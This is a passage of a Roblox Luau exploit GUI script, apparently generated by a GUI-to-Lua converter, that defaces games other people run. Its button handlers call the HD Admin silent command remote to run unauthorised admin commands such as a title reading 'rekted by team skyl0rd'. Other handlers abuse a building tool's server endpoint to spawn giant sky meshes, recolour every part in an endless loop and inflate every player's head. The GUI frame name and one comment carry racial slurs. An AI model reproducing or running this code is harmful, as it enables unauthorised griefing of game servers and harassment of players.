						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"111891702759441")
					SetTexture(v,id)
					SetTrans(v, 0)
					MeshResize(v,Vector3.new(5000,5000,5000))
					SetLocked(v,true)
				end
			end
		end
		Sky("9422866248")
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_77);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_79()
local script = G2L["79"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";title all rekted by team skyl0rd")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_79);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_7b()
local script = G2L["7b"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
	
		local Players = game:GetService("Players")
		local workspace = game:GetService("Workspace")
		local player = Players.LocalPlayer
	
		local function findTool()
			local char = player.Character or player.CharacterAdded:Wait()
	
			for _, v in ipairs(char:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			for _, v in ipairs(player.Backpack:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
		end
	
		local tool = findTool()
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function call(a)
			return remote:InvokeServer(unpack(a))
		end
	
		-- i dont used the b2s sky function anymore, i used this instead
		local hack = workspace:FindFirstChild("E")
		if hack then
			call({ "Remove", { hack } })
		end
	
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
	
		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
	
		task.spawn(function()
			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
		end)
	
		task.spawn(function()
			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
		end)
	
		task.spawn(function()
			call({ "CreateMeshes", { { Part = sky } } })
		end)
	
		task.spawn(function()
			call({
				"SyncMesh",
				{{
					Part = sky,
					MeshId = "rbxassetid://111891702759441",
					TextureId = "rbxassetid://74384891605247",
					Scale = Vector3.new(100999, 100999, 100999),
					VertexColor = Vector3.new(3.6, 3.6, 3.6)
				}}
			})
		end)
	
		task.spawn(function()
			call({ "SetLocked", { sky }, true })
		end)
	
		task.spawn(function()
			call({ "SetName", { sky }, "E" })
		end)
	
		task.spawn(function()
			call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } })
		end)
	
		task.spawn(function()
			call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
		end)
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_7b);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_7d()
local script = G2L["7d"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
	
		local Players = game:GetService("Players")
		local workspace = game:GetService("Workspace")
		local player = Players.LocalPlayer
	
		local function findTool()
			local char = player.Character or player.CharacterAdded:Wait()
	
			for _, v in ipairs(char:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			for _, v in ipairs(player.Backpack:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
		end
	
		local tool = findTool()
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function call(a)
			return remote:InvokeServer(unpack(a))
		end
	
		-- i dont used the b2s sky function anymore, i used this instead
		local hack = workspace:FindFirstChild("E")
		if hack then
			call({ "Remove", { hack } })
		end
	
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
	
		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
	
		task.spawn(function()
			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
		end)
	
		task.spawn(function()
			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
		end)
	
		task.spawn(function()
			call({ "CreateMeshes", { { Part = sky } } })
		end)
	
		task.spawn(function()
			call({
				"SyncMesh",
				{{
					Part = sky,
					MeshId = "rbxassetid://111891702759441",
					TextureId = "rbxassetid://11147531429",
					Scale = Vector3.new(100999, 100999, 100999),
					VertexColor = Vector3.new(3.6, 3.6, 3.6)
				}}
			})
		end)
	
		task.spawn(function()
			call({ "SetLocked", { sky }, true })
		end)
	
		task.spawn(function()
			call({ "SetName", { sky }, "E" })
		end)
	
		task.spawn(function()
			call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } })
		end)
	
		task.spawn(function()
			call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
		end)
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_7d);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_7f()
local script = G2L["7f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";disco ")
		RequestCommandSilent:InvokeServer(";fog 879532795327953279532795327953279532795327953279532795327953279532795327953279532795327953279532795327953279532795327953279532795327953279532 532789789789789789789789789789789789789789789789789352 ")
	
		--                                                           ^ put a command like ;fly
		--i just have that nga, of you want more dm me at roadblockswashere
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_7f);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_81()
local script = G2L["81"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function randomise()
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						Color(v,Color3.new(math.random(0,255),math.random(0,255),math.random(0,255)))
					end)
				end
			end
		end
		while true do
			randomise()
			task.wait(0.4)
		end
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_81);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_83()
local script = G2L["83"];
	script.Parent.MouseButton1Click:Connect(function()
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
	
		function BigHead(player)
			local chara = player.Character
			spawn(function()
				SetLocked(chara.Head,false)
				MeshResize(chara.Head,Vector3.new(15,15,15))
			end)
		end
		for i,players in game.Players:GetPlayers() do
			BigHead(players)
			end
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_83);
-- StarterGui.ScreenGui.DragScript
local function C_84()
local script = G2L["84"];
	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	
	local player = Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")
	
	-- Wait for the ScreenGui to be cloned to PlayerGui
	local screenGui = script.Parent
	local dragFrame = screenGui:WaitForChild("nigg")
	
	local dragging = false
	local dragInput = nil
	local dragStart = nil
	local startPos = nil
	
	local function update(input)
		local delta = input.Position - dragStart
		dragFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	dragFrame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = dragFrame.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	dragFrame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;
task.spawn(C_84);

return G2L["1"], require;